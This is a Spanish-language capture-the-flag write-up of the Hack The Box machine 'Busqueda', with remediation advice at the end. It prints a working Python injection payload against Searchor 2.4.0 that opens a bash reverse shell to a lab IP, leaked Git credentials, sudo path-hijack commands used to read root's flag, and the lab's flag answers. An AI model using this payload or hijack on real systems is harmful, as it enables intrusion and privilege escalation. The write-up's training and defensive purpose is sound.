@@ -1,0 +1,73 @@
+Resumen Ejecutivo:
+
+Busqueda es una máquina Linux que se centra en la explotación de una Inyección de Código (RCE) en la librería de Python Searchor 2.4.0. 
+La post-explotación implica el descubrimiento de credenciales en un repositorio Git y una escalada de privilegios mediante Secuestro de Rutas Relativas 
+(Relative Path Hijacking) en un script de administración.
+
+Enumeración:
+Escaneo de Puertos
+
+nmap -sC -sV -oN nmap/initial 10.129.44.41
+
+Puerto 22 (SSH): Abierto.
+Puerto 80 (HTTP): Redirige a http://searcher.htb.
+
+Análisis Web:
+
+La aplicación utiliza Searchor 2.4.0. Al investigar esta versión, se identificó que es vulnerable a la ejecución remota de comandos debido al uso inseguro de la función,
+eval() al procesar las consultas del usuario.
+
+Explotación:
+
+Acceso Inicial (RCE)
+Inyectando un payload de Python en el parámetro query, se logró ejecutar una reverse shell:
+
+Python
+
+',__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.204/4444 0>&1"'))#
+
+Movimiento Lateral:
+
+Dentro del directorio /var/www/app, revisé el historial y la configuración de Git. En el archivo .git/config se encontraron las siguientes credenciales:
+
+Usuario: cody (perteneciente al grupo svc)
+
+Contraseña: jh1usoih2bkjaspwe92
+
+Escalada de Privilegios:
+Enumeración Local
+
+Al revisar los permisos de sudo:
+
+svc@busqueda:~$ sudo -l
+(root) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *
+El script /opt/scripts/system-checkup.py permite ejecutar una acción llamada full-checkup. Al analizar el script, se descubrió que busca ejecutar un archivo llamado full-checkup.sh usando una ruta relativa en el directorio de trabajo actual.
+
+Explotación de Root (Path Hijacking)
+
+Creé un script malicioso en /dev/shm (directorio con permisos de escritura):
+
+echo -e '#!/bin/bash\ncp /root/root.txt /dev/shm/root_flag.txt\nchmod 666 /dev/shm/root_flag.txt' > /dev/shm/full-checkup.sh
+chmod +x /dev/shm/full-checkup.sh
+Ejecuté el script de sistema desde dicha ubicación:
+
+cd /dev/shm
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+Extracción de la flag:
+
+cat /dev/shm/root_flag.txt
+
+Flags:
+
+User: 1bf740141668001bdab5a6fb79fd9bbf
+
+Root: 2d90138c32ef89b0dfeeff9ce75ba54a
+
+Remediación y Buenas Prácticas:
+
+Sanitización de Entradas: Actualizar la librería Searchor a una versión que no utilice eval() con datos proporcionados por el usuario.
+
+Rutas Absolutas en Scripts: Los scripts que se ejecutan con privilegios de root deben llamar a sus dependencias y archivos usando rutas absolutas 
+(ej. /opt/scripts/check.sh) para evitar secuestros de ejecución.
+
+Gestión de Secretos: No almacenar contraseñas ni configuraciones sensibles en repositorios de código (Git).
